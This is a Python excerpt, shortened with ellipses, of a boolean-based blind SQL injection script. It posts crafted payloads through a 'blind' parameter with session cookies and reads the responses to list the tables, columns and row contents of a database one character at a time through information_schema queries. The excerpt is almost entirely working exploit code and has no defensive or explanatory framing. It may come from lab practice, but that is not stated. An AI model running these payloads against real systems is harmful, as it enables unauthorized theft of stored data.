...
def main():
    ...
    for num_table in range(49, 55):
        payload = f"1' and ascii(mid((SELECT count(*) table_name from information_schema.tables WHERE table_schema=database() limit 0,1),1,1))= {num_table}-- -"
        param = dict(blind=payload)
        time.sleep(3)
        if test_str in req.post_request(url, param, cook):
            break
    ...
    for j in range(num_table):
        payload = f"1' and ascii(substring((SELECT concat(table_name) from information_schema.tables WHERE table_schema=database() limit {j},1),%s,1))%s-- -"
    ...
    for num_columns in range(49, 58):
        payload = f"1' and ascii(substring((SELECT count(*) column_name from information_schema.columns WHERE table_name='{table_name}' limit 0,1),1,1))={num_columns}-- -"
        param = dict(blind=payload)
        time.sleep(3)
        if test_str in req.post_request(url, param, cook):
            break
    ...
    for num_col in range(num_columns):
        payload = f"1' and ascii(substring((SELECT concat(column_name) from information_schema.columns WHERE table_name='{table_name}' limit {num_col},1),%s,1))%s-- -"
    ...
    for num_row in range(1, 6):
        for name in column_name:
            payload = f"1' and ascii(substring((select {name} from {table_name} limit {num_row},1),%s,1))%s-- -"
